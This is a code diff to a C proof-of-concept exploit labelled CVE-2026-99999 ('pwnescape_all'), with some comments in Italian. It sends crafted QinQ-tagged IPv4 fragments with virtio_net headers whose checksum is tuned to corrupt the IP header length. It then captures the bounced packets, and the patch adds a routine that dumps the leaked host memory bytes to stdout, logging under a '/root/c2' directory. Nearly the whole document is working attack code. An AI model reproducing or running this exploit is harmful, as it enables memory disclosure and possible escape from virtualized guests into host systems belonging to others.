@@ -1,7 +1,8 @@
-/* pwnescape_all.c — CVE-2026-99999 PoC (sender + readback in un processo)
+/* pwnescape_all.c — CVE-2026-99999 PoC (sender + readback, leak -> stdout)
  * gcc -O2 -Wall -pthread -o pwnescape_all pwnescape_all.c
  * Usage (root): ./pwnescape_all <iface> <src_ip> <dst_ip> <frag_id> [csum_start] [csum_offset]
- * Log: /root/c2/log.txt (append) */
+ * Log: /root/c2/log.txt (append); leak bytes also dumped to stdout
+ */
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -23,12 +24,16 @@
 #include <linux/virtio_net.h>
 #include <netinet/in.h>
 #include <stdarg.h>
+#include <stdint.h>
 
 #ifndef IP_MF
 #define IP_MF 0x2000
 #endif
 #ifndef PACKET_VNET_HDR
 #define PACKET_VNET_HDR 15
+#endif
+#ifndef VIRTIO_NET_HDR_F_NEEDS_CSUM
+#define VIRTIO_NET_HDR_F_NEEDS_CSUM 1
 #endif
 
 #define IHL_FLIP_HI 0x4f
@@ -49,22 +54,29 @@ static void lg(const char *fmt, ...) {
     char ts[32];
     strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", localtime(&t));
     pthread_mutex_lock(&g_log_mu);
-    fprintf(g_log, "[%s] ", ts);
-    va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap);
-    fputc('\n', g_log);
-    fflush(g_log);
+    if (g_log) {
+        fprintf(g_log, "[%s] ", ts);
+        va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap);
+        fputc('\n', g_log);
+        fflush(g_log);
+    }
+    /* mirror to stderr so stdout stays clean for the leak dump */
+    fprintf(stderr, "[%s] ", ts);
+    va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap);
+    fputc('\n', stderr);
+    fflush(stderr);
     pthread_mutex_unlock(&g_log_mu);
 }
 
-/* ---------- checksum helpers (invariati) ---------- */
+/* ---------- checksum helpers ---------- */
 static uint16_t fold16(uint32_t s) {
     while (s >> 16) s = (s & 0xffff) + (s >> 16);
     return ~s & 0xffff;
 }
 static uint32_t be_sum(const uint8_t *p, int n) {
     uint32_t s = 0;
-    for (int i = 0; i + 1 < n; i += 2) s += (p[i] << 8) | p[i + 1];
-    if (n & 1) s += p[n - 1] << 8;
+    for (int i = 0; i + 1 < n; i += 2) s += ((uint32_t)p[i] << 8) | p[i + 1];
+    if (n & 1) s += (uint32_t)p[n - 1] << 8;
     return s;
 }
 static uint16_t iph_checksum(const uint8_t *h, int len) {
@@ -73,7 +85,7 @@ static uint16_t iph_checksum(const uint8_t *h, int len) {
 static int tune_payload(uint8_t *p1, uint32_t base_sum) {
     for (int x = 0; x < 256; x++)
         for (int y = 0; y < 256; y++) {
-            uint16_t f = fold16(base_sum + ((uint32_t)x << 8) + y);
+            uint16_t f = fold16(base_sum + ((uint32_t)x << 8) + (uint32_t)y);
             if ((f & 0xff00) == ((uint16_t)IHL_FLIP_HI << 8)) {
                 p1[0] = (uint8_t)x; p1[1] = (uint8_t)y;
                 return 0;
@@ -164,6 +176,23 @@ static volatile int g_run = 1;
 static uint16_t g_want_id;
 static int g_seen_frag, g_seen_mutated;
 
+/* dump 32 leaked bytes to stdout as hex + ASCII */
+static void dump_leak(const uint8_t *p, int n, const char *why) {
+    char hex[3 * 64 + 1], asc[64 + 1];
+    int hn = 0, an = 0, m = n > 60 ? 60 : n;
+    for (int i = 0; i < m; i++) {
+        hn += snprintf(hex + hn, sizeof(hex) - hn, "%02x ", p[i]);
+        asc[an++] = (p[i] >= 0x20 && p[i] < 0x7f) ? (char)p[i] : '.';
+    }
+    hex[hn] = '\0'; asc[an] = '\0';
+    /* stdout: the actual leaked bytes */
+    printf("LEAK[%s] len=%d hex: %s\n", why, n, hex);
+    printf("LEAK[%s] ascii: %s\n", why, asc);
+    fflush(stdout);
+    lg("    leak hex: %s", hex);
+    lg("    leak ascii: %s", asc);
+}
+
 static void *rx_thread(void *arg) {
     int fd = open_pkt_sock((const char *)arg, 0);   /* RX socket: no vnet hdr */
     if (fd < 0) return NULL;
@@ -176,31 +205,34 @@ static void *rx_thread(void *arg) {
         if (n < (ssize_t)(14 + 20)) continue;
         if (from.sll_pkttype == PACKET_OUTGOING) continue;   /* scarta il proprio TX */
         uint8_t *ip = buf + 14;
-        uint16_t ethertype = (buf[12] << 8) | buf[13];
-        while ((ethertype == 0x8100 || ethertype == 0x88a8) && (ip - buf) + 4 <= n) {
-            ethertype = (ip[2] << 8) | ip[3];
-            ip += 4;
+        size_t hdr_rem = (size_t)n - 14;
+        uint16_t ethertype = (uint16_t)((buf[12] << 8) | buf[13]);
+        while ((ethertype == 0x8100 || ethertype == 0x88a8) && hdr_rem >= 4) {
+            ethertype = (uint16_t)((ip[2] << 8) | ip[3]);
+            ip += 4; hdr_rem -= 4;
         }
         if (ethertype != 0x0800) continue;
-        if (n < (ip - buf) + 20) continue;
-        uint8_t ihl = (ip[0] & 0x0f) * 4;
-        uint16_t id = (ip[4] << 8) | ip[5];
+        if (hdr_rem < 20) continue;
+        uint8_t ihl = (uint8_t)((ip[0] & 0x0f) * 4);
+        uint16_t id = (uint16_t)((ip[4] << 8) | ip[5]);
         if (id != g_want_id) continue;
         g_seen_frag = 1;
         lg("[frag rx] id=0x%04x iph[0]=0x%02x ihl=%u tot_len=%u off=0x%04x",
            id, ip[0], ihl, (ip[2] << 8) | ip[3], (ip[6] << 8) | ip[7]);
         if (ip[0] == IHL_FLIP_HI) {
             g_seen_mutated = 1;
-            int opts_len = ihl - 20, leaked = 0;
-            lg("[+] IHL MUTATO (0x4f): %d byte di 'options'", opts_len);
-            char hex[1024];
-            size_t o = 0;
-            for (int i = 20; i < ihl && o < sizeof(hex) - 4; i++) {
+            int opts_len = (int)ihl - 20;
+            if (opts_len < 0) opts_len = 0;
+            /* clamp to what we actually received */
+            if ((size_t)(20 + opts_len) > hdr_rem) opts_len = (int)hdr_rem - 20;
+            if (opts_len < 0) opts_len = 0;
+            int leaked = 0;
+            for (int i = 20; i < 20 + opts_len; i++)
                 if (ip[i] != FILL_BYTE) leaked++;
-                o += (size_t)snprintf(hex + o, sizeof(hex) - o, "%02x ", ip[i]);
-            }
-            lg("    options: %s", hex);
-            lg("    ==> byte options != 0x%02x (disclosure host): %d/%d", FILL_BYTE, leaked, opts_len);
+            lg("[+] IHL MUTATO (0x4f): %d byte di 'options', %d != 0x%02x",
+               opts_len, leaked, FILL_BYTE);
+            /* >>> dump dei byte reali su stdout <<< */
+            dump_leak(ip + 20, opts_len, "ip-options");
         }
     }
     close(fd);
@@ -218,7 +250,7 @@ int main(int argc, char **argv) {
 
     mkdir("/root/c2", 0755);
     g_log = fopen(LOG_PATH, "a");
-    if (!g_log) { perror("fopen log"); g_log = stderr; }
+    if (!g_log) { perror("fopen log"); }   /* lg() handles NULL */
     g_want_id = id;
 
     uint8_t dhost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x05 };
@@ -235,7 +267,7 @@ int main(int argc, char **argv) {
 
     static uint8_t f1[QINQ_HDR_LEN + IP4_HDR_LEN + 8];
     static uint8_t tailbuf[QINQ_HDR_LEN + IP4_HDR_LEN + 9200];
-    if (QINQ_HDR_LEN + IP4_HDR_LEN + plen > sizeof(tailbuf)) { lg("plen overflow"); return 1; }
+    if (QINQ_HDR_LEN + IP4_HDR_LEN + plen > (int)sizeof(tailbuf)) { lg("plen overflow"); return 1; }
 
     build_frag1(f1, dhost, shost, saddr, daddr, id, p1);
     uint32_t base = be_sum(f1 + QINQ_HDR_LEN, IP4_HDR_LEN)
@@ -275,6 +307,6 @@ int main(int argc, char **argv) {
         lg("[-] VERDETTO: frammenti tornati ma drift non avvenuto (tx offload? decap VLAN? csum_start?)");
     else
         lg("[-] VERDETTO: nessun frammento id=0x%04x tornato (bounce/NAT assente o defrag host assente)", id);
-    fclose(g_log);
+    if (g_log) fclose(g_log);
     return g_seen_mutated ? 0 : 1;
 }
